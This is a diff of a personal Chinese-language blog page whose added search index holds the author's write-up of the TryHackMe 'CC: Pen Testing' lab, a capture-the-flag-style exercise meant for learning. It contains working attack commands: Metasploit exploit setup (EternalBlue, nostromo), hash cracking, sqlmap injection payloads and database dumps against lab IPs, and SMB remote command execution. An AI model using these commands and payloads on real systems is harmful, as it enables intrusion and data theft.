@@ -9,7 +9,7 @@
 <meta name="description" content="(*≧︶≦))(￣▽￣* ) 隐藏于互联网之下的私人小站">
 <meta name="theme-color" content="#a5d8ff">
 <title>悠远乡</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1621579485048">
+<link rel="shortcut icon" href="/favicon.ico?v=1623145732167">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -193,7 +193,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">11</span>
+        <span class="site-item-stat-count">12</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -275,6 +275,8 @@
         
       
         
+      
+        
           
             
       
@@ -307,6 +309,8 @@
       <a class="cloud-tag" href="https://1dayluo.github.io/tag/FAvNfDwrs/" rel="1">vue</a>
     
       
+      
+        
       
         
       
@@ -349,6 +353,8 @@
       <a class="cloud-tag" href="https://1dayluo.github.io/tag/NSNKs-xPEC/" rel="1">前端</a>
     
       
+      
+        
       
         
       
@@ -401,6 +407,8 @@
         
       
         
+      
+        
           
         
           
@@ -435,6 +443,8 @@
       <a class="cloud-tag" href="https://1dayluo.github.io/tag/yJLgLfyyu/" rel="1">flask</a>
     
       
+      
+        
       
         
       
@@ -479,6 +489,8 @@
       <a class="cloud-tag" href="https://1dayluo.github.io/tag/7Wdu5WLBU/" rel="3">python</a>
     
       
+      
+        
       
         
       
@@ -1325,6 +1337,286 @@
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://1dayluo.github.io/post/cc-pen-testingorwriteupornote/"" data-c="
+          &lt;h1 id=&#34;cc-pen-testingwriteupnote&#34;&gt;CC: Pen Testing|Writeup|Note&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/ccpentesting&#34;&gt;TryHackMe | CC: Pen Testing&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;metasploit&#34;&gt;&lt;strong&gt;Metasploit&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;竟然用了三个section来将这个metasploit。。。&lt;/p&gt;
+&lt;h3 id=&#34;section-3-metasploit-selectiong-a-module&#34;&gt;section 3 - Metasploit: Selectiong a module&lt;/h3&gt;
+&lt;p&gt;当你遇到想要利用的漏洞到特定的机器上，需要设置合适的选项（options），这个任务帮助你为最流行的metasploit模组“永恒之蓝” 选择和设置options。所有基本的命令都可以在选择模组之前，也可以在选择模组之后。因为这个题目是让你学会使用内部命令学习操作方式，所以我学习的方式就是输入一个help，然后对某个具体的command再进行一遍help &lt;command&gt;&lt;/p&gt;
+&lt;p&gt;选择模组：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置目标hosts的option&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RHOSTS
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置目标port的option&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RPORT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用来设置option的命令&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如何设置SMBPass为username&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set SMBPass username
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如何设置SMBUser为password&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set SMBUser password
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What option sets the architecture to be exploited? (不太懂这个）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ARCH
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哪一个option用来设置发送给目标机器的payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;payload
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当你设置完了全部要求的options，如何运行exploit&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;exploit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哪一个flag可以设为后台运行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-j
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后是列出全部的session和进入一个可交互的session中。其实都用命令&lt;code&gt;help sessions&lt;/code&gt; 就可以查出来了&lt;/p&gt;
+&lt;h3 id=&#34;section-3-metasploitmeterpreter&#34;&gt;section 3-Metasploit:meterpreter&lt;/h3&gt;
+&lt;p&gt;metasploit是msf入侵成功后，和被入侵的机器进行交互的一个msf模块。具体的使用教程看这里：&lt;a href=&#34;https://www.cnblogs.com/backlion/p/9484949.html&#34;&gt;https://www.cnblogs.com/backlion/p/9484949.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;如何获取到的是cmdshell的机器，那么可以考虑把对面的机器作为跳板，升级为meterpreter&lt;/p&gt;
+&lt;p&gt;如何升级？&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sessions -u &amp;lt;opt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.notion.so/6f918dbfaaeb4649a6860208a9c96f43&#34;&gt;Copy of View&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;section3-metasploit-final-walkthrough&#34;&gt;Section3-Metasploit: Final Walkthrough&lt;/h3&gt;
+&lt;p&gt;在一台机子上进行实战测试，目标主机在80端口上存在漏洞，能被msf的exploit/multi/http/nostromo_code_exec 模块利用。&lt;/p&gt;
+&lt;p&gt;参考：&lt;a href=&#34;https://ryankozak.com/hack-the-box-craft-traverxec/&#34;&gt;https://ryankozak.com/hack-the-box-craft-traverxec/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;总是在exploit命令执行提示失败，查看网上网友&lt;a href=&#34;https://www.youtube.com/watch?v=6USFMv6BWOc&#34;&gt;视频&lt;/a&gt;[43:49]&lt;/p&gt;
+&lt;p&gt;第一步：选择模块&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;use exploit/multi/http/nostromo_code_exec
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第二步 设置远程目标机器ip&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;set RHOSTS 10.10.129.133
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第三步 设置远程目标机器端口&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;set RPORT 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置监听地址（为VPN提供的地址）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;set LHOST 10.2.74.194
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置监听port（一直以为也是80 原来是考察具体的漏洞，是1337）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;set LPORT 1337
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;a href=&#34;https://cd6629.gitbook.io/ctfwriteups/linux-privesc/cc-pen-testing&#34;&gt;https://cd6629.gitbook.io/ctfwriteups/linux-privesc/cc-pen-testing&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;出现Exploit completed, but no session was created的原因：LHOST应设为能够链接到ip的当前vpn的地址&lt;/p&gt;
+&lt;p&gt;出现链接成功后：输入&lt;code&gt;shell&lt;/code&gt; 进入session （输入&lt;code&gt;help&lt;/code&gt;提示）&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/06/08/YUldSLhzCiVqIAc.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;salting-and-formatting&#34;&gt;&lt;strong&gt;Salting and Formatting&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;盐的格式：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;hash1&amp;gt;:&amp;lt;salt&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;hashcat&#34;&gt;&lt;strong&gt;hashcat&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;一款hash破解工具&lt;/p&gt;
+&lt;p&gt;mode对应的md5类型表：&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;设置mode的flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-m
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置&amp;quot;attack mode&amp;quot;的flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;去破解&lt;code&gt;56ab24c15b72a457069c5ea42fcfc640&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;需要将hash保存到本地文件中，然后hashcat自带的字典是rockyou.txt(/usr/share/wordlist/rockyou.txt)。非kali系统可能需要自行&lt;a href=&#34;https://github.com/brannondorsey/naive-hashcat/releases&#34;&gt;下载&lt;/a&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;hashcat -a 3 -m 0 ~/wordlist/hashcat/test.txt   ~/wordlist/hashcat/rockyou.txt --force
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;同理MD4。mode换为MD4对应的900就好&lt;/p&gt;
+&lt;h2 id=&#34;john-the-ripper&#34;&gt;&lt;strong&gt;john the ripper&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;也是一款hash工具&lt;/p&gt;
+&lt;p&gt;非kali需要用snap下载最新版（不然format=raw-md5在1.9版本以下不识别)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo apt install snapd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo snap install john-the-ripper&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;选择wordlist&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--wordlist
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择hash类型&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--format
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置规则&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--rules
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Crack this hash:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;5d41402abc4b2a76b9719d911017c592&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Type: MD5&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;john  --format=Raw-MD5 --wordlist=rockyou.txt md5.hash #创建破解任务
+john --show md5.hash --format=Raw-MD5 #查看所有已破解的值
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Crack this hash:&lt;/p&gt;
+&lt;p&gt;5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8&lt;/p&gt;
+&lt;p&gt;Type: SHA1&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;john  --format=Raw-SHA1 --wordlist=rockyou.txt sha1.txt
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;sqlmap&#34;&gt;&lt;strong&gt;sqlmap&lt;/strong&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;section5-sqlmap&#34;&gt;Section5-sqlmap&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;-hh&lt;/code&gt;查看更多帮助&lt;/p&gt;
+&lt;p&gt;指定url&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-u
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用google dork（试了一下好像能够给出我的用户名，搜索出有哪些网站&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-g
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;增加参数（例如url中的&lt;a href=&#34;http://ex.com/?test=1&#34;&gt;http://ex.com?test=1&lt;/a&gt; 的参数为test)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;说明后端指定的数据库类型&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--dbms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;sqlmap渗透等级（等级越高越精确)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--level
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如何获取数据库下的全部表&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;
+--dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择要枚举的数据库&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;	-D
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择要枚举的数据库的表&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-T
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;选择要枚举的数据表的column&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;-C
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;获取shell交互&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--os-shell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哪一个flag是从所有表中dump全部数据&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;--dump-all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;section5-a-note-on-manual-sql-injection&#34;&gt;Section5-A Note on Manual SQL Injection&lt;/h3&gt;
+&lt;p&gt;有时候不能使用sqlmap有以下情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对方有防火墙&lt;/li&gt;
+&lt;li&gt;有请求次数限制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;接下来section的part将介绍手动注入，参考见&lt;a href=&#34;https://www.owasp.org/index.php/SQL_Injection&#34;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;section5-vulnerable-web-application&#34;&gt;Section5-Vulnerable Web Application&lt;/h3&gt;
+&lt;p&gt;实战。&lt;/p&gt;
+&lt;p&gt;对目标ip进行sqlmap（因为没有get的p参数，所以用了—forms）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;python sqlmap.py -u http://10.10.27.86  --forms --dbs --level 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行内容截取 🍈&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and risk (1) values? [Y/n] y
+结果： 
+Parameter: msg (POST)
+Type: boolean-based blind
+Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+Payload: msg=ldLL&#39; RLIKE (SELECT (CASE WHEN (8089=8089) THEN 0x6c644c4c ELSE 0x28 END))-- Hukx
+Type: error-based
+Title: MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+Payload: msg=ldLL&#39; AND GTID_SUBSET(CONCAT(0x7171627a71,(SELECT (ELT(8564=8564,1))),0x717a7a7071),8564)-- ANkH
+Type: time-based blind
+Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: msg=ldLL&#39; AND (SELECT 9863 FROM (SELECT(SLEEP(5)))uRim)-- UOih
+[23:24:29] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 7.0.33
+back-end DBMS: MySQL &amp;gt;= 5.6
+[23:24:35] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#39;/home/nnkmeopw/snap/sqlmap/18/.local/share/sqlmap/output/results-06072021_1111pm.csv&#39;
+
+web server operating system: Linux Ubuntu
+web application technology: PHP 7.0.33
+back-end DBMS: MySQL &amp;gt;= 5.6
+[04:44:16] [INFO] fetching database names
+[04:44:17] [INFO] retrieved: &#39;information_schema&#39;
+[04:44:18] [INFO] retrieved: &#39;mysql&#39;
+[04:44:18] [INFO] retrieved: &#39;performance_schema&#39;
+[04:44:18] [INFO] retrieved: &#39;sys&#39;
+[04:44:19] [INFO] retrieved: &#39;tests&#39;
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] tests
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在知道有三个类型的sql漏洞，一共5个数据库&lt;/p&gt;
+&lt;p&gt;dump数据库&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;python sqlmap.py -u http://10.10.27.86  --forms -D tests --dump
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;samba&#34;&gt;&lt;strong&gt;Samba&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;samba 在windows渗透中最常见到的。&lt;/p&gt;
+&lt;h3 id=&#34;section6-smbmap&#34;&gt;Section6-smbmap&lt;/h3&gt;
+&lt;p&gt;smbmap是最常用的枚举smb的工具&lt;/p&gt;
+&lt;p&gt;设置验证的用户名&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-u
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置password&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置host&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-H
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;假设你有权限，如何在服务器上运行命令&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;设置要枚举的共享对象&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-s
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;枚举的域名&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;哪一个flag来下载保存为一个文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;--download
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;--upload
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Given the username &amp;quot;admin&amp;quot;, the password &amp;quot;password&amp;quot;, and the ip &amp;quot;10.10.10.10&amp;quot;, how would you run ipconfig on that machine （啊这个引号。。。）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;smbmap -u &amp;quot;admin&amp;quot; -p &amp;quot;password&amp;quot; -h 10.10.10.10  -x &#39;ipconfig&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;section6-smbclient&#34;&gt;Section6-smbclient&lt;/h3&gt;
+&lt;p&gt;也是一款针对samba的工具,samba不太懂，怕翻译错。随机翻译&lt;/p&gt;
+&lt;p&gt;How do you specify which domain(workgroup) to use when connecting to the host?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-W
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;How do you specify the ip address of the host?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-I
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;How do you run the command &amp;quot;ipconfig&amp;quot; on the target machine?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-c &amp;quot;ipconfig
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;How do you specify the username to authenticate with?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-U
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;How do you specify the password to authenticate with?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-P
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What flag is set to tell smbclient to not use a password?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;-N
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;While in the interactive prompt, how would you download the file test, assuming it was in the current directory?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;get test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In the interactive prompt, how would you upload your /etc/hosts file&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;put /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;section6-a-note-about-impacket&#34;&gt;Section6-A note about impacket&lt;/h3&gt;
+&lt;p&gt;impacket is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;here.&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;另一个samba的工具。&lt;/p&gt;
+&lt;h2 id=&#34;miscellaneout&#34;&gt;&lt;strong&gt;Miscellaneout&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;权限提升，没有题目， 但是这里给出了一些不同平台下的权限提升的笔记和教程&lt;/p&gt;
+&lt;p&gt;privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.&lt;/p&gt;
+&lt;p&gt;General:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings&lt;/a&gt; (A bunch of tools and payloads for every stage of pentesting)&lt;/p&gt;
+&lt;p&gt;Linux:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&#34;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt; (a bit old but still worth looking at)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/rebootuser/LinEnum&#34;&gt;https://github.com/rebootuser/LinEnum&lt;/a&gt; (One of the most popular priv esc scripts)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh&#34;&gt;https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh&lt;/a&gt; (Another popular script)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/mzet-/linux-exploit-suggester&#34;&gt;https://github.com/mzet-/linux-exploit-suggester&lt;/a&gt; (A Script that&#39;s dedicated to searching for kernel exploits)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;https://gtfobins.github.io&lt;/a&gt; (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)&lt;/p&gt;
+&lt;p&gt;Windows:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.fuzzysecurity.com/tutorials/16.html&#34;&gt;https://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;  (Dictates some very useful commands and methods to enumerate the host and gain intel)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp&#34;&gt;https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp&lt;/a&gt; (A bit old but still an incredibly useful script)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/411Hall/JAWS&#34;&gt;https://github.com/411Hall/JAWS&lt;/a&gt; (A general enumeration script)&lt;/p&gt;
+">CC Pen Testing|Writeup|Note</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://1dayluo.github.io/post/markdown-tips/"" data-c="
